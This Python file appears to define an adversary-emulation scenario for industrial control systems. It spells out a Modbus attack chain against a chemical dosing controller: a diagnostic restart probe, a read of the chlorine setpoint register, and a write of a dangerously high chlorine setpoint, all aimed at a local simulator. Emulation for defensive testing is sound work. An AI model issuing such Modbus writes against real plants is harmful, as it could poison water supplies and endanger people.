"""Scenario: Unauthorized Chemical Dosing Setpoint Alteration (MITRE ATT&CK for ICS)."""

from seal.el.attack_graph import AttackGraph, EffectAction, EffectStep


def create_unauthorized_dosing_campaign() -> AttackGraph:
    """Creates a 3-step attack graph simulating unauthorized chemical setpoint modification."""
    graph = AttackGraph(
        campaign_id="EL-CAMPAIGN-001",
        name="Chemical Dosing Override & Recon",
        description="Emulates adversary conducting Modbus diagnostics before injecting toxic chlorine setpoints.",
    )

    # Step 1: Reconnaissance via Modbus Diagnostics
    step1 = EffectStep(
        step_id="STEP_RECON_01",
        name="Modbus Diagnostic Probe",
        description="Query PLC-01 diagnostic subfunctions to check controller response.",
        technique_id="T0846",
        action=EffectAction(
            action_type="MODBUS_DIAGNOSTIC",
            target_ip="127.0.0.1",
            target_port=5020,
            unit_id=1,
            function_code=8,
            metadata={"subfunction": "0x0000_RESTART_COMM_OPTION"},
        ),
    )

    # Step 2: Read Current Process Setpoint
    step2 = EffectStep(
        step_id="STEP_READ_02",
        name="Read Chlorine Setpoint Register",
        description="Read holding register 1004 to inspect current chemical setpoint.",
        technique_id="T0855",
        dependencies=["STEP_RECON_01"],
        action=EffectAction(
            action_type="MODBUS_READ",
            target_ip="127.0.0.1",
            target_port=5020,
            unit_id=1,
            function_code=3,
            register_address=1004,
            process_tag="CHLORINE_PPM",
        ),
    )

    # Step 3: Malicious Parameter Override (Toxic dosing)
    step3 = EffectStep(
        step_id="STEP_WRITE_03",
        name="Inject Toxic Setpoint (8.5 PPM)",
        description="Write dangerously high chlorine dosing setpoint to holding register 1004.",
        technique_id="T0836",
        dependencies=["STEP_READ_02"],
        precondition_conditions={"PUMP1_RPM": {">": 500}},  # Lazy precondition: pump must be running
        action=EffectAction(
            action_type="MODBUS_WRITE",
            target_ip="127.0.0.1",
            target_port=5020,
            unit_id=1,
            function_code=16,
            register_address=1004,
            register_value=8.5,
            process_tag="CHLORINE_PPM",
        ),
    )

    graph.add_step(step1)
    graph.add_step(step2)
    graph.add_step(step3)

    return graph
